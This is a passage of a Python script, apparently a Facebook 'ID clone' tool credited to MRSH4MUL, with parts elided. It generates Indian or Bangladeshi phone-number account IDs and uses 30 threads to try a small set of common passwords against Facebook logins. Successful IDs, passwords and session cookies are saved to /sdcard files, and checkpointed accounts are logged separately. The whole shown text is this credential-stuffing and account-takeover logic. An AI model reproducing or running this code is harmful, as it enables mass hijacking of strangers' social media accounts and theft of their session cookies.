...
def clear():
    ...
    print("\x1b[97m>_ DEVELOPER  : MRSH4MUL")
    print("\x1b[97m>_ GITHUB     : MRSH4MUL")
...
def randomclone():
    clear()
    print(">_ 1 >> INDIAN ID CLONE")
    print(">_ 2 >> BANGLADESH ID CLONE")
    print(40*"-")
    rnx = input(">_ SELECT >> ")
    if rnx == "1":indian_rndm()
    elif rnx == "2":bangladesh_rndm()
    else:main()

def indian_rndm():
    clear()
    print(">_ EXAMPLE  >> +91620,+91637")
    ...
    with ThreadPoolExecutor(max_workers=30) as Fucker:
        ...
        for xxx in gen:
            ids = code + xxx
            psx = [ids,xxx,'57273200','59039200','57575751','57575752','07860786']
        ...
        for pas in psx:
            ...
            with __import__('requests').Session() as session:
                ...
                if 'session_key' in q:
                    ...
                    open('/sdcard/SH4MUL-M1-RNDM-OK.txt','a').write(uid+'|'+pas+'|'+coki+'\n')
                    oks.append(uid)
                    break
                elif 'www.facebook.com' in q['error']['message']:
                    open('/sdcard/SH4MUL-M1-RNDM-CP.txt','a').write(ids+'|'+pas+'\n')
                    cps.append(ids)
                    break
                else:continue
        loop+=1
        ...
        for pas in psx:
            ...
            with __import__('requests').Session() as session:
                ...
                if 'session_key' in q:
                    ...
                    open('/sdcard/SH4MUL-M2-RNDM-CP.txt','a').write(ids+'|'+pas+'\n')
                    cps.append(ids)
                    break
                else:continue
        loop+=1
        ...
        for pas in psx:
            ...
            with __import__('requests').Session() as session:
                ...
                if 'session_key' in q:
                    ...
                    coki = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
                    print(f"\r\x1b[m>_ : OK >> \x1b[38;5;46m{uid} • {pas}")
                    open('/sdcard/SH4MUL-M3-RNDM-OK.txt','a').write(uid+'|'+pas+'|'+coki+'\n')
                    oks.append(uid)
                    break
                elif 'www.facebook.com' in q['error_msg']:
                    open('/sdcard/SH4MUL-M3-RNDM-CP.txt','a').write(ids+'|'+pas+'\n')
                    cps.append(ids)
                    break
                else:continue
        loop+=1
        ...
        for pas in psx:
            ...
            with __import__('requests').Session() as session:
                ...
                if 'session_key' in q:
                    ...
                    coki = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
                    print(f"\r\x1b[m>_ : OK >> \x1b[38;5;46m{uid} • {pas}")
                    open('/sdcard/SH4MUL-M4-RNDM-OK.txt','a').write(uid+'|'+pas+'|'+coki+'\n')
                    oks.append(uid)
                    break
                elif 'www.facebook.com' in q['error']['message']:
                    open('/sdcard/SH4MUL-M4-RNDM-CP.txt','a').write(ids+'|'+pas+'\n')
                    cps.append(ids)
                    break
                else:continue
        loop+=1
    ...
    try:
        ...
        for pas in psx:
            ...
            if 'session_key' in q:
                ...
                coki = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
                print(f"\r\x1b[m>_ : OK >> \x1b[38;5;46m{uid} • {pas}")
                open('/sdcard/MRSH4MUL-M5-RNDM-OK.txt','a').write(uid+'|'+pas+'|'+coki+'\n')
                oks.append(uid)
                break
            elif 'www.facebook.com' in q['error']['message']:
                open('/sdcard/SH4MUL-M5-RNDM-CP.txt','a').write(ids+'|'+pas+'\n')
                cps.append(ids)
                break
            else:continue
        loop+=1
    ...
    try:
        ...
        for pas in psx:
            ...
            if 'session_key' in q:
                ...
                coki = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
                print(f"\r\x1b[m>_ : OK >> \x1b[38;5;46m{uid} • {pas}")
                open('/sdcard/SH4MUL-M6-RNDM-OK.txt','a').write(uid+'|'+pas+'|'+coki+'\n')
                oks.append(uid)
                break
            elif 'www.facebook.com' in q['error']['message']:
                open('/sdcard/SH4MUL-M6-RNDM-CP.txt','a').write(ids+'|'+pas+'\n')
                cps.append(ids)
                break
            else:continue
        loop+=1
